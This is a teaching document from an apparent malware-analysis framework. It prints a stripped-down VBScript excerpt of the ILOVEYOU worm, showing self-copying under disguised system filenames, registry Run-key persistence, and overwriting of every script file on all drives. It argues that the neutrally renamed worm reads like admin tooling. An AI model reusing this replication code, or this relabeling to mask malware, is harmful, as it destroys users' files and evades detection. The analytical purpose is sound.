# ILOVEYOU Strip-Down — A Transformation Exercise

> **Note:** This is a *demonstration*, not a corpus sample. The three-section
> Cortex analysis of the original worm lives in [`iloveyou.md`](iloveyou.md).
> This file shows what happens when you strip ILOVEYOU of its malware
> vocabulary and leave the operations intact — the most direct proof of
> **"code is label-agnostic."**

---

## The exercise

Remove from the original source:

- The `"ILOVEYOU"` subject line
- The `"LOVE-LETTER-FOR-YOU.TXT.vbs"` and similar disguised filenames
- The `spreadtoemail()` function name (rename to something neutral)
- The email attachment logic
- The entire social-engineering body (`"kindly check the attached LOVELETTER"`)

Keep everything else. Don't change a single operation.

## What remains

```vbscript
sub main()
  Set dirwin = fso.GetSpecialFolder(0)
  Set dirsystem = fso.GetSpecialFolder(1)
  c.Copy(dirsystem & "\MSKernel32.vbs")
  c.Copy(dirwin & "\Win32DLL.vbs")
  regruns()
  listadriv()
end sub

sub regruns()
  regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32", ...
end sub

sub infectfiles(folderspec)
  for each f1 in fc
    ext = fso.GetExtensionName(f1.path)
    if (ext = "vbs") or (ext = "vbe") then
      set ap = fso.OpenTextFile(f1.path, 2, true)
      ap.write vbscopy
      ap.close
    end if
  next
end sub

sub listadriv()
  Set dc = fso.Drives
  For Each d in dc
    folderlist(d.path & "\")
  next
end sub
```

Functions preserved:

- Folder traversal logic
- File copying and overwriting
- Registry persistence (autorun keys)
- System-folder access
- Replication pattern
- Recursive execution
- Error suppression

*Everything still works.* The stripped script would happily run and produce
the same on-disk effects as the original.

## What is now missing

- `"ILOVEYOU"` as a subject — it's not there to emotionally manipulate anyone
- `"LOVE-LETTER-FOR-YOU"` as a filename — no deceptive label
- `spreadtoemail()` — the propagation verb is gone (even if the mechanism
  could be re-added under a neutral name)
- The body text — no social-engineering copy

The surface semantics are entirely neutralized.

## Is this still "malware"?

A reader approaching the stripped code with no history would read it as:

- A configured system-replication tool that places two named scripts in
  `%SYSTEM%` and `%WINDIR%`
- A registry-based autostart configurator
- A recursive drive-traversal script that writes template content to every
  VBS/VBE file it encounters
- A startup-linked utility of some kind

Every single one of those readings is defensible. None of them requires the
"malware" label. The same code, deployed on a workstation you own, under
written authorization, as part of a configuration-management system, is
indistinguishable from legitimate administrative tooling.

## Where the malice actually lived

Strip it back in:

1. **What** was being copied: `vbscopy = file.ReadAll` — the script was
   copying *itself*, not a configuration template
2. **Where** it was placed: `%SYSTEM%\MSKernel32.vbs` was a name designed to
   masquerade as a Windows internal
3. **What** it overwrote: every script file on every drive, not a declared
   target
4. **How** the next hop happened: unsolicited email to every address in the
   victim's contact list, impersonating the victim
5. **Whether** the system owner said yes: never asked

None of those are *code properties*. They are *deployment properties* —
external metadata the runtime never evaluates.

## The generalization

```
Original ILOVEYOU        → rich violation surface (see iloveyou.md)
Stripped ILOVEYOU        → zero repository-level violations
Stripped ILOVEYOU run    →
  with authorization     → legitimate utility
  without authorization  → violations re-emerge from context alone,
                           no code change required
```

The framework's insistence that authorization is externally supplied — the
position defended by the boundary-test samples (`mimikatz_repo.md`,
`mgeeky_red_teaming_repo.md`) — is proven by this transformation. The same
code, same operations, reads as malware or utility depending on consent
metadata the code itself has no access to.

## Why this is in the corpus

As a *teaching piece*. It is not a Cortex three-section analysis (the
original ILOVEYOU analysis in `iloveyou.md` already covers that). Its role
is to anchor, in executable terms, the framework's central claim:

> **Code can't express intent or consent.**
> **Context is never in the code. It's external metadata.**

Everything downstream in Cortex — the gap metric, the boundary-test pattern,
the severity cap, the LLM-training corollary in `framework.md` — follows
from that single observation.

## References

- [`iloveyou.md`](iloveyou.md) — the original worm's three-section analysis
- [`../framework.md`](../framework.md) — the framework and its LLM-training
  corollary
- [`../genesis.md`](../genesis.md) — the origin reasoning that produced the
  framework, including this strip-down exercise in its original form
